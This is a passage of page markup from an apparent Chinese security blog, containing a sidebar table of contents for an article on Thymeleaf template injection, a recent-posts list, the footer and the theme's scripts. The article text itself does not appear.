href="/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Jackson原生反序列化"><img class="cover" src="http://cdn.clown2024.cn/202407151814130.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-12</div><div class="title">Jackson原生反序列化</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#demo%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">Demo示例</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E8%AF%AD%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">一些语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#springmvc%E8%A7%86%E5%9B%BE%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">SpringMVC视图解析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%81%E8%A3%85modelandview%E5%AF%B9%E8%B1%A1"><span class="toc-number">4.1.</span> <span class="toc-text">封装ModelAndView对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96modelandview%E8%A7%86%E5%9B%BE"><span class="toc-number">4.2.</span> <span class="toc-text">获取ModelAndView视图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%86%E5%9B%BE%E6%B8%B2%E6%9F%93"><span class="toc-number">4.3.</span> <span class="toc-text">视图渲染</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#templatename%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.1.</span> <span class="toc-text">templatename漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">5.1.1.</span> <span class="toc-text">流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uri-path"><span class="toc-number">5.2.</span> <span class="toc-text">URI PATH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">5.2.1.</span> <span class="toc-text">流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98"><span class="toc-number">5.3.</span> <span class="toc-text">回显问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.4.</span> <span class="toc-text">注入内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF"><span class="toc-number">5.5.</span> <span class="toc-text">其他姿势</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">6.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="thymeleaf模板注入"><img src="http://cdn.clown2024.cn/202407151814125.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thymeleaf模板注入"/></a><div class="content"><a class="title" href="/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="thymeleaf模板注入">thymeleaf模板注入</a><time datetime="2024-12-12T16:09:58.000Z" title="发表于 2024-12-13 00:09:58">2024-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="Tabby使用学习"><img src="http://cdn.clown2024.cn/202407151814114.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tabby使用学习"/></a><div class="content"><a class="title" href="/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="Tabby使用学习">Tabby使用学习</a><time datetime="2024-11-30T17:16:29.000Z" title="发表于 2024-12-01 01:16:29">2024-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/" title="红日靶场五"><img src="http://cdn.clown2024.cn/202407151814130.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场五"/></a><div class="content"><a class="title" href="/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/" title="红日靶场五">红日靶场五</a><time datetime="2024-11-20T17:01:38.000Z" title="发表于 2024-11-21 01:01:38">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob"><img src="http://cdn.clown2024.cn/202407151814125.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCtf-easyjob"/></a><div class="content"><a class="title" href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob">DASCtf-easyjob</a><time datetime="2024-11-18T11:57:35.000Z" title="发表于 2024-11-18 19:57:35">2024-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="http://cdn.clown2024.cn/202407151814125.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"/></a><div class="content"><a class="title" href="/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-11-15T14:00:56.000Z" title="发表于 2024-11-15 22:00:56">2024-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
